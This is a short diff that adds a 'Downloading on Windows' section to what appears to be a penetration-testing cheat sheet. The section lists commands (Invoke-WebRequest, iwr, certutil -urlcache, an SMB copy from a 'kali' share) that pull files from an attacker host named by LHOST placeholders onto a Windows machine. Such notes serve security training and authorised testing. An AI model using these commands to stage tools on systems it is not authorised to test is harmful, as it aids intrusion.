@@ -20,14 +20,14 @@ Valid PowerShell cmdlets/methods that can be used to download files:
 
 
 
+- Downloading on Windows
 
-
-
-
-
-
-
-
+```
+powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
+iwr -uri http://lhost/file -Outfile file
+certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
+copy \\kali\share\file .
+```
 
 
 
